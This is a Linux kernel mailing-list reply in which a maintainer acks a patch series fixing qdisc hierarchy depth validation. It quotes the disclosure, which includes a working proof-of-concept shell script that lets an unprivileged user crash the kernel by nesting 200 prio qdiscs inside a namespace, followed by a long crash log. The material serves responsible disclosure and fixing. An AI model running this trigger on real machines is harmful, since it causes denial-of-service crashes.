Received: from mail-yw1-f169.google.com (mail-yw1-f169.google.com [209.85.128.169])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 19B27296BAF
	for <linux-kselftest@vger.kernel.org>; Sat,  1 Aug 2026 14:13:33 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.128.169
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785593616; cv=pass; b=kxF5Ic4JYAq4wT/nfKmAdPY5avXvKqs5tcV8/EkFVyCDIQaE4SlpyMfcGRP+zE5ygCa1T0maMUOcGLpTcFAl1AwNvd+KfomfZ2OJlXo+hUGeHCBZQfJbruUg3wy3S0jKoC6B/jnEWRIMVGrWWED2WfQ5clcyR5p4aeZDTEC0GD8=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785593616; c=relaxed/simple;
	bh=Rh/JNHjj8cf8VgquoWg3Cla0DQgqrRN+evFBzbm5pMI=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=fiMt96PdUp4UYbqPtWifpU5BzVmfmy5Ds3nRTqv72WnoIBRs3jOBLwTeHKqyKUOZVFTb+O8RJJoh2fDemR4TI+Uv7YPsSVzoOdiHiQ3j+8jGDq/Ko6THVN0XFzwQYxNBHeESWseAd7wPXD5oSWa6Nf/9HiAIAI7chr5Y9Vudwsg=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com; spf=none smtp.mailfrom=mojatatu.com; dkim=pass (1024-bit key) header.d=mojatatu.com header.i=@mojatatu.com header.b=fIWamvqk; arc=pass smtp.client-ip=209.85.128.169
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com
Authentication-Results: smtp.subspace.kernel.org; spf=none smtp.mailfrom=mojatatu.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=mojatatu.com header.i=@mojatatu.com header.b="fIWamvqk"
Received: by mail-yw1-f169.google.com with SMTP id 00721157ae682-81ea0b7d137so16344797b3.2
        for <linux-kselftest@vger.kernel.org>; Sat, 01 Aug 2026 07:13:33 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1785593613; cv=none;
        d=google.com; s=arc-20260327;
        b=sh1n0t3TJyck0lQqouaNlLEOqMrvCVXTS2zANRFSH0lo77iCrKAHIy+FijUN3FG9IX
         lYxVpPgFyI5l9BQyrgv2J7mJSloe4r/0vLflH+f2ngzZ3liBPUW3VZyOInU6yi8riT6g
         nYbzb3o65P1SysiK0n94NdACNC1c9rxmacosikcksMduAkZgzQXUuMH6bKper7LaCcxj
         neXRzC/jyTbGowPmZN+JAT6eakuAI/fDH7FTethOi0oPEUuru0LLJYSc3TR1AdqsUT+y
         owzqPs2CE+aHPI6KQXvejKtF8FarZG6/jVUQA1edALPSs4myiaus9BR/ueGAHy7KRkx7
         ykjA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=Bwq3HqSkCLN6NQzYxB/VHyuDKV3GNDbNs6qQf/PdDDM=;
        fh=j8T9nksydU1PfSiU6orkb8SVC3qUi2i07p0kGhU9frM=;
        b=H5ej6j8xLU3hVzMEkVmnq8styi3L4DzL+KwXBDy6Yo5nMGBUJfljUhenBb3d8ggK1q
         ORoeegNwJiZ8CWWBmvD7VEtfIO+NhD53f9Jed8wGw7yY+JS4k14O6n7XIzSZs+LTo4z/
         tNX9SzJbf07vkS9m4DNK/+3EpY5d5xKY9r2dr2guwn5S117OuGipDh/I+9roz7kJZTKi
         0LqcdvWso7d1n9OV8A/MsNOrn45GYzWgJtKkEVCvwhgRuDYN8CNaxmL97vUVQ28jmtkv
         Pghdoq8bL1O3sgCVEfHUZgMj4v6ff/fsGOBn3BdwA5wI4K0pIhF98wztbUMNU9LmVA2f
         Q8xQ==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=mojatatu.com; s=google; t=1785593613; x=1786198413; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=Bwq3HqSkCLN6NQzYxB/VHyuDKV3GNDbNs6qQf/PdDDM=;
        b=fIWamvqkYOSkRqBUTwTRXKhX6ng6bvL1/dvev1tPR8yhjAzgZW4uJF18zXzPgS3dho
         4I1IVrBjZMLztEHCS/xFxpwQygzuTfSDzVNENfmZKr4t4ZgXGZjHOqE1dovrB4kzG75M
         V85unARqN9F9yG9gxw5noJhSyq7eDpEsPF8ZI=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785593613; x=1786198413;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=Bwq3HqSkCLN6NQzYxB/VHyuDKV3GNDbNs6qQf/PdDDM=;
        b=WRpc2aTVcCXc6+WKM3/a4G5U2IuLAlvoA5ELT5tU/b+/mVb7HctJ51Lp+lt+f7UBaS
         un1gONhFe5oWO24AUksX8WY46fTMFA7oQgOcybzXryqsqzz/dS9Y+ALM0KCVkuA5/xBL
         PzxkOCyum8nV2MHVo6yUx/rE3PYkNvl11eLuMWtZ3dJvOCordu5Rh8f8VS/LGLUgGW8U
         qp/aIATWIio+LY/1z8vHK888poaFt6rqpHVaOuX+TRVlqfmj93kEyQzYlbLNVQdJqprC
         WrPfrVkMeZAqMTDjodSCNruI7TK9PjsxJynttQYjSji4kAv24G2XMDg+hfIX77abCUoJ
         F5mQ==
X-Forwarded-Encrypted: i=1; AHgh+RrYs5PqvUuC48d4kxiQpjPHOld3PcpfliX+LdF2pnbfm/QLUkwLf87mazHrI8aps2Z/3UhB8FAdtnFiJ7Rs308=@vger.kernel.org
X-Gm-Message-State: AOJu0YyfXxUyed+uqF38i4pH2EC19vtJwysUJwyRKsxauSjy94jEKr6C
	ix/sYR0UC2dH7DEWooz2E7+WBWEr9NnhIc1tGm4AGinyrR6JC4urt/20B+jHPvkc90AkCvBcMIl
	Ys7aw5uB18NQ7FADkoAA8tH0GzcLRuJH6hfUKBcNX
X-Gm-Gg: AR+sD12VQsh1zn1iAzO9vfGftuScIM5/VY9KjOufOXyNcujQI0DmJt/HBtoRINcN0E1
	RhW6GMDxkM2IyUbFGapGR9ovYUaKVwKtED1uF3QtHsxjvMfjbEUrotAcgagVw/8eUtru3GpxKNp
	/5mtz3hlzHL5n/a6hj7e3i3la4cIuxtfTRgpFNlu/eKq5nJQi0qRRXKd/Qb3tDiViTPep0+lkPJ
	0Yw9UHMDutFY2VMR2+QtKVWmh3ckVKEPAASHK1op/aeKjXENvPpAjbrQEwTvp3JksUzZMYA/MSr
	DWerpVazhbRaZKHRnLOVhLXg1HdzWCmX9X02uzQgPtNO6g==
X-Received: by 2002:a05:690c:c507:b0:81d:ff0a:2cfe with SMTP id
 00721157ae682-81fd4a086a9mr54478567b3.8.1785593612783; Sat, 01 Aug 2026
 07:13:32 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-kselftest@vger.kernel.org
List-Id: <linux-kselftest.vger.kernel.org>
List-Subscribe: <mailto:linux-kselftest+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kselftest+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <cover.1785434373.git.milkory@outlook.com>
In-Reply-To: <cover.1785434373.git.milkory@outlook.com>
From: Jamal Hadi Salim <jhs@mojatatu.com>
Date: Sat, 1 Aug 2026 10:13:21 -0400
X-Gm-Features: AUfX_mx2m1c33NDDZRLf8ch34Ns3mVSkh7OIW2kkfSlq0KzfsOr-4gn3rloT7IY
Message-ID: <CAM0EoMnn7abbVjA=oHHR-fGO8VUeBoTPb9npBKgS69r5H3S3Tw@mail.gmail.com>
Subject: Re: [PATCH net v2 0/2] net/sched: fix qdisc graft hierarchy validation
To: Ren Wei <enjou1224z@gmail.com>
Cc: netdev@vger.kernel.org, linux-kernel@vger.kernel.org, 
	linux-kselftest@vger.kernel.org, davem@davemloft.net, edumazet@google.com, 
	kuba@kernel.org, pabeni@redhat.com, horms@kernel.org, jiri@resnulli.us, 
	vega@nebusec.ai, milkory@outlook.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Sat, Aug 1, 2026 at 9:42=E2=80=AFAM Ren Wei <enjou1224z@gmail.com> wrote=
:
>
> From: Zijie Huang <milkory@outlook.com>
>
> Hi Linux kernel maintainers,
>
> We found and validated a issue in net/sched/sch_api.c. The bug is reachab=
le
> by a non-root user via user and net namespace. We've tested it, and it
> should not affect any other functionality.
>
> We will provide detailed information about the bug in this email, along
> with a PoC to trigger it.
>

I should have said thanks for the tdc test. For the series:

Acked-by: Jamal Hadi Salim <jhs@mojatatu.com>

cheers,
jamal
> ---- details below ----
>
> Bug details:
>
> The qdisc create-and-graft path allows users to keep attaching new classf=
ul
> qdiscs under an already deep parent hierarchy. Such a hierarchy can later
> be walked recursively and exhaust the kernel stack.
>
> This series stores the qdisc hierarchy depth in struct Qdisc and checks i=
t
> when a qdisc is grafted. New child qdiscs are rejected once the parent is
> already at the maximum allowed depth. It also adds tdc coverage for the
> maximum allowed depth and rejection above it.
>
> Reproducer:
>
>     chmod +x ./poc.sh
>     ./poc.sh namespace
>
> We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
>
> ------BEGIN poc.sh------
>
> #!/bin/sh
> set -eu
> PATH=3D/usr/sbin:/usr/bin:/sbin:/bin
>
> DEPTH=3D"${DEPTH:-200}"
> IFACE0=3D"${IFACE0:-veth0}"
> IFACE1=3D"${IFACE1:-veth1}"
> MODE=3D"${1:-root}"
>
> setup_and_trigger() {
>         ip link del "$IFACE0" 2>/dev/null || true
>         ip link add "$IFACE0" type veth peer name "$IFACE1"
>
>         sysctl -q -w "net.ipv6.conf.$IFACE0.disable_ipv6=3D1"
>         sysctl -q -w "net.ipv6.conf.$IFACE1.disable_ipv6=3D1"
>
>         ip addr add 10.0.0.1/24 dev "$IFACE0"
>         ip addr add 10.0.0.2/24 dev "$IFACE1"
>
>         tc qdisc add dev "$IFACE0" root handle 1: prio
>
>         i=3D1
>         while [ "$i" -le "$DEPTH" ]; do
>                 parent_major=3D"$(printf '%x' "$i")"
>                 child_major=3D"$(printf '%x' $((i + 1)))"
>                 tc qdisc add dev "$IFACE0" parent "${parent_major}:2" han=
dle "${child_major}:" prio
>                 i=3D$((i + 1))
>         done
>
>         ip link set "$IFACE0" up
>         ip link set "$IFACE1" up
>
>         ping -c 1 -W 1 -I "$IFACE0" 10.0.0.2 >/dev/null
> }
>
> case "$MODE" in
> root)
>         setup_and_trigger
>         ;;
> namespace)
>         exec unshare -Urn sh "$0" inner
>         ;;
> inner)
>         setup_and_trigger
>         ;;
> *)
>         echo "usage: $0 [root|namespace]" >&2
>         exit 1
>         ;;
> esac
>
> ------END poc.sh--------
>
> ----BEGIN crash log----
>
> [  192.465021][    C0] BUG: TASK stack guard page was hit at ffffc9000dbd=
7fd8 (stack is ffffc9000dbd8000..ffffc9000dbe0000)
> [  192.465084][    C0] Oops: stack guard page: 0000 [#1] SMP KASAN NOPTI
> [  192.465127][    C0] CPU: 0 UID: 1001 PID: 10556 Comm: ping Not tainted=
 7.2.0-rc4-00413-ge095f249e220 #1 PREEMPT(full)
> [  192.465149][    C0] Hardware name: QEMU Standard PC (i440FX + PIIX, 19=
96), BIOS 1.17.0-debian-1.17.0-1 04/01/2014
> [  192.465153][    C0] RIP: 0010:prio_enqueue+0x2e/0x7c0
> [  192.465254][    C0] Code: 55 48 89 e5 41 57 41 56 41 55 49 bd 00 00 00=
 00 00 fc ff df 41 54 49 89 fc 53 48 89 f3 48 83 e4 f0 48 83 c4 80 4c 8d 74=
 24 20 <48> 89 54 24 18 48 c7 44 24 20 b3 8a b5 41 49 c1 ee 03 48 c7 44 24
> [  192.465260][    C0] RSP: 0018:ffffc9000dbd7fe0 EFLAGS: 00010283
> [  192.465274][    C0] RAX: ffffffff89a12450 RBX: ffff88804c17cc00 RCX: f=
fffffff89a1298d
> [  192.465278][    C0] RDX: ffffc9000dbdf380 RSI: ffff88804c17cc00 RDI: f=
fff88803c2ca580
> [  192.465282][    C0] RBP: ffffc9000dbd8090 R08: 0000000000000005 R09: 0=
00000000000ffff
> [  192.465286][    C0] R10: 0000000000000000 R11: 0000000000000001 R12: f=
fff88803c2ca580
> [  192.465289][    C0] R13: dffffc0000000000 R14: ffffc9000dbd8000 R15: f=
fff88804c179280
> [  192.465293][    C0] FS:  00007f69fe54f000(0000) GS:ffff8880d62af000(00=
00) knlGS:0000000000000000
> [  192.465306][    C0] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [  192.465310][    C0] CR2: ffffc9000dbd7fd8 CR3: 000000004b49e000 CR4: 0=
000000000352ef0
> [  192.465314][    C0] Call Trace:
> [  192.465316][    C0]  <TASK>
> [  192.465319][    C0]  ? tcf_classify+0x3db/0x1250
> [  192.465343][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465349][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465356][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465363][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465370][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465376][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465384][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465390][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465398][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465404][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465411][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465417][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465425][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465431][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465439][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465445][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465453][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465459][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465467][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465473][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465480][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465486][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465494][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465500][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465507][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465513][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465520][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465527][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465562][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465656][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465665][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465673][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465682][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465690][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465699][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465707][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465716][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465735][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465744][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465753][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465779][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465807][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465816][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465824][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465834][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465843][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465851][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465858][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465865][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465871][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465879][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465885][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465893][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465899][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465907][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465913][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465921][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465927][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465935][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465941][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465949][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465955][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465962][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465969][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465976][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465983][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.465990][    C0]  prio_enqueue+0x209/0x7c0
> [  192.465996][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466004][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466011][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466018][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466025][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466032][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466039][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466046][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466053][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466060][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466066][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466074][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466080][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466088][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466094][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466102][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466108][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466116][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466122][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466130][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466136][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466144][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466150][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466158][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466164][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466172][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466178][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466186][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466192][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466200][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466206][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466228][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466235][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466243][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466249][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466258][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466264][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466272][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466278][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466285][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466291][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466299][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466305][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466312][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466319][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466326][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466333][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466340][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466347][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466354][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466360][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466367][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466373][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466380][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466387][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466395][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466401][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466409][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466415][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466422][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466428][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466436][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466442][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466449][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466455][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466471][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466477][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466484][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466490][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466498][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466504][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466512][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466518][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466525][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466532][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466539][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466545][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466553][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466559][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466567][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466573][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466581][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466587][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466594][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466600][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466608][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466614][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466621][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466628][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466635][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466641][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466649][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466655][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466662][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466668][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466675][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466682][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466690][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466696][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466703][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466709][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466716][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466722][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466730][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466736][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466743][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466749][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466757][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466763][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466770][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466776][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466784][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466790][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466797][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466803][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466810][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466816][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466824][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466830][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466837][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466844][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466851][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466857][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466865][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466871][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466878][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466884][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466892][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466898][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466905][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466911][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466919][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466925][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466932][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466939][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466946][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466952][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466959][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466965][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466973][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466979][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.466986][    C0]  prio_enqueue+0x209/0x7c0
> [  192.466992][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467000][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467014][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467022][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467028][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467035][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467043][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467050][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467056][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467063][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467070][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467077][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467083][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467091][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467097][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467104][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467111][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467118][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467124][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467132][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467138][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467145][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467152][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467159][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467165][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467174][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467180][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467188][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467194][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467201][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467207][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467215][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467221][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467228][    C0]  prio_enqueue+0x209/0x7c0
